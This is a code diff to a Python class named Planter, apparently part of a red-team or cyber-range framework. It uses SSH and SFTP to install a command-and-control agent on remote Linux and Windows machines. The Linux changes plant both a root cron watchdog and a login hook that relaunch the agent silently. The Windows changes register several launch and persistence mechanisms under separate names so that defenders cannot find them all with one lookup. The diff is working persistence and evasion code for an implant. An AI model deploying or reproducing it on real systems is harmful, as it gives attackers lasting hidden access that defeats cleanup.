@@ -230,52 +230,62 @@ class Planter:
                 "check_cmd": f"systemctl is-active {unit}"}
 
     def _linux_redundant(self, ip, fh, drawn, remote, stage):
-        """One persistence surface beyond the systemd unit.
+        """Persistence surfaces beyond the systemd unit.
 
-        A lone unit is the first thing a defender greps for. A cron file (boot +
-        a 17-minute watchdog) or a login hook brings the agent back after the
-        unit is killed, and blue has to sweep a second location. Best effort: the
-        unit is the primary surface, so this only ever adds a note.
+        A lone unit is the first grep a defender runs. A cron file (boot + a
+        17-minute watchdog) or a login hook brings the agent back after the unit
+        is killed, and blue has to sweep a second location. With
+        `c2.implant_spread: full` BOTH are planted — the coverage mode the QA runs
+        use. Best effort either way: the unit is the primary surface, so this only
+        ever adds a note.
         """
         from ..effects.base import root_cmd        # lazy: avoids a cycle
-        mech = self.ctx.rng.choice(LINUX_REDUNDANCY)
+        NL = chr(10)
+        c2 = (self.ctx.cfg or {}).get("c2") or {}
+        full = str(c2.get("implant_spread", "draw")).strip().lower() == "full"
+        mechs = list(LINUX_REDUNDANCY) if full else [self.ctx.rng.choice(LINUX_REDUNDANCY)]
         stem = drawn["stem"]
-        if mech == "cron_watch":
-            path = f"/etc/cron.d/{stem}"
-            body = (f"@reboot root {remote} >/dev/null 2>&1\n"
-                    f'*/17 * * * * root pgrep -f "{remote}" >/dev/null 2>&1 '
-                    f"|| {remote} >/dev/null 2>&1\n")
-        else:
-            path = f"/etc/profile.d/{stem}.sh"
-            body = (f'# {drawn["unit_desc"]}\n'
-                    f'pgrep -f "{remote}" >/dev/null 2>&1 '
-                    f"|| {{ setsid {remote} >/dev/null 2>&1 & }}\n")
-        staged = f"{stage}/{Path(path).name}"
-        local = None
-        try:
-            fd, local = tempfile.mkstemp(prefix="tlaloc-extra-", suffix=".txt")
-            with os.fdopen(fd, "w", encoding="utf-8") as handle:
-                handle.write(body)
-            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", local,
-                                  staged, mode=0o644, key_path=fh.get("key_path"))
-            restart = ("systemctl try-restart cron 2>/dev/null "
-                       "|| service cron restart 2>/dev/null || true"
-                       if mech == "cron_watch" else "true")
-            rc, out, err = self.ctx.ssh.ssh(
-                ip, fh["user"], fh.get("password") or "",
-                root_cmd(f"mv {staged} {path} && chmod 644 {path}", fh) + "\n" + restart,
-                timeout=90, key_path=fh.get("key_path"))
-            undo = [f"rm -f {path}"]
+        chosen, paths, undo, notes = [], [], [], []
+        for mech in mechs:
             if mech == "cron_watch":
-                undo.append("systemctl try-restart cron 2>/dev/null || true")
-            return ([mech], [path], undo,
-                    f"{mech} at {path} rc={rc}" if rc == 0
-                    else f"{mech} rc={rc}: {(err or out).strip()[:120]}")
-        except Exception as exc:                       # redundancy is optional
-            return [], [], [], f"{mech} failed: {exc}"
-        finally:
-            if local and os.path.exists(local):
-                os.unlink(local)
+                path = "/etc/cron.d/" + stem
+                body = ("@reboot root " + remote + " >/dev/null 2>&1" + NL
+                        + '*/17 * * * * root pgrep -f "' + remote + '" >/dev/null 2>&1 '
+                        + "|| " + remote + " >/dev/null 2>&1" + NL)
+            else:
+                path = "/etc/profile.d/" + stem + ".sh"
+                body = ("# " + str(drawn.get("unit_desc") or stem) + NL
+                        + 'pgrep -f "' + remote + '" >/dev/null 2>&1 '
+                        + "|| { setsid " + remote + " >/dev/null 2>&1 & }" + NL)
+            staged = stage + "/" + path.rsplit("/", 1)[-1]
+            local = None
+            try:
+                fd, local = tempfile.mkstemp(prefix="tlaloc-extra-", suffix=".txt")
+                with os.fdopen(fd, "w", encoding="utf-8") as handle:
+                    handle.write(body)
+                self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", local,
+                                      staged, mode=0o644, key_path=fh.get("key_path"))
+                restart = ("systemctl try-restart cron 2>/dev/null "
+                           "|| service cron restart 2>/dev/null || true"
+                           if mech == "cron_watch" else "true")
+                rc, out, err = self.ctx.ssh.ssh(
+                    ip, fh["user"], fh.get("password") or "",
+                    root_cmd("mv " + staged + " " + path + " && chmod 644 " + path, fh)
+                    + NL + restart,
+                    timeout=90, key_path=fh.get("key_path"))
+                chosen.append(mech)
+                paths.append(path)
+                undo.append("rm -f " + path)
+                if mech == "cron_watch":
+                    undo.append("systemctl try-restart cron 2>/dev/null || true")
+                notes.append(mech + " at " + path + " rc=0" if rc == 0 else
+                             mech + " rc=" + str(rc) + ": " + (err or out).strip()[:120])
+            except Exception as exc:                       # redundancy is optional
+                notes.append(mech + " failed: " + str(exc))
+            finally:
+                if local and os.path.exists(local):
+                    os.unlink(local)
+        return chosen, paths, undo, "; ".join(notes)
 
     def _install_windows(self, ip, box_id, local, transport, wait_sec=120):
         """Plant the frozen payload through a mix of Windows mechanisms.
@@ -297,11 +307,20 @@ class Planter:
         rng = self.ctx.rng
         drawn = names.windows_names(self.ctx.world, rng=rng,
                                     mode=names.mode_from_cfg(self.ctx.cfg))
-        launcher = rng.choice(WINDOWS_LAUNCHERS)
-        redundant = [m for m in WINDOWS_REDUNDANCY
-                     if m not in (launcher,)]
-        rng.shuffle(redundant)
-        redundant = redundant[:rng.choice((1, 2))]
+        full_spread = (str(((self.ctx.cfg or {}).get("c2") or {})
+                           .get("implant_spread", "draw")).strip().lower() == "full")
+        if full_spread:
+            # Coverage/QA mode: every surface on this box, so a run proves each
+            # implant path instead of whichever ones the draw happened to pick.
+            launcher = WINDOWS_LAUNCHERS[0]
+            redundant = list(WINDOWS_LAUNCHERS[1:]) + [
+                m for m in WINDOWS_REDUNDANCY if m not in WINDOWS_LAUNCHERS]
+        else:
+            launcher = rng.choice(WINDOWS_LAUNCHERS)
+            redundant = [m for m in WINDOWS_REDUNDANCY
+                         if m not in (launcher,)]
+            rng.shuffle(redundant)
+            redundant = redundant[:rng.choice((1, 2))]
         remote_dir = f"C:\\ProgramData\\{drawn['stem']}"
         remote = f"{remote_dir}\\{box_id}.exe"
         staged = f"C:/ProgramData/{drawn['stem']}/{box_id}.exe"
@@ -320,7 +339,16 @@ class Planter:
         undo, artifacts, notes = [], [], []
         chosen = []
         for mechanism in [launcher] + redundant:
-            spec = WINDOWS_MECHANISMS[mechanism](self, ip, fh, drawn, remote, guard)
+            names_i = drawn
+            if full_spread:
+                # Each surface registers under its own drawn names: three task
+                # triggers sharing one task name would overwrite each other, and
+                # one name reused across registry + WMI is a single-lookup IOC.
+                # The payload path (stem) deliberately stays the same.
+                names_i = dict(names.windows_names(self.ctx.world, rng=rng,
+                                                   mode=names.mode_from_cfg(self.ctx.cfg)),
+                               stem=drawn["stem"])
+            spec = WINDOWS_MECHANISMS[mechanism](self, ip, fh, names_i, remote, guard)
             chosen.append(mechanism)
             notes.append(f"{mechanism}: {spec['detail']}")
             undo.extend(spec["undo"])
